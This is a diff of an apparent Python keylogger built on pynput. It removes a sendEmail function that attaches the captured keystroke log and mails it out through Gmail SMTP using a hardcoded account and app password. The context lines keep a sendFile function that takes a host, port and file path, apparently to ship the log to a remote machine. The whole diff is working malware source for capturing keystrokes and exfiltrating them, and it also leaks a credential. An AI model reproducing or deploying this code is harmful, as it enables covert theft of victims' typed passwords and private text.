@@ -2,11 +2,6 @@ import os
 import platform;
 import sys;
 import socket;
-import smtplib;
-from email.mime.text import MIMEText;
-from email.mime.base import MIMEBase
-from email.mime.multipart import MIMEMultipart
-from email import encoders
 from typing import *;
 from requests import get;
 from pynput.keyboard import Listener, Key
@@ -133,56 +128,6 @@ def searchFile(start: str, target: str) -> Union[str, None]:
         if target in file or target in dir:
             return os.path.join(root, target)
     return None
-
-def sendEmail(filePath: str) -> None:
-    """
-    Send email with current text in the keylogger file
-    """
-    # Add Mail Configuration
-    smtp_server: str = "smtp.gmail.com"
-    smtp_port: int = 587
-    smtp_username: str = "kevincisneros29@gmail.com"
-    smtp_password: str = "vrjatronwbyjullq"
-
-    # Email Content
-    sender: str = "kevincisneros29@gmail.com"
-    recipient: str = "kevincisneros29@duck.com"
-    subject: str = "Gifts"
-    body: str = ""
-
-    # Create a multipart message
-    message = MIMEMultipart()
-    message['Subject'] = subject
-    message['From'] = sender
-    message['To'] = recipient
-
-    # Add the email body
-    message.attach(MIMEText(body, 'plain'))
-    
-    # Attach the file
-    attachment = open(filePath, 'rb')
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload(attachment.read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', f'attachment; filename={filePath}')
-    message.attach(part)
-
-    try:
-        # Establish a connection to the SMTP server
-        server = smtplib.SMTP(smtp_server, smtp_port)
-        server.starttls()
-
-        # Login to email account
-        server.login(smtp_username, smtp_password)
-
-        # Send the email
-        server.sendmail(sender, recipient, message.as_string())
-
-    except Exception as e:
-        print('An error occurred while sending the email:', str(e))
-    finally:
-        # Close the connection to the SMTP server
-        server.quit()
 
 def sendFile(host: str, port: int, filepath: str) -> None:
     """
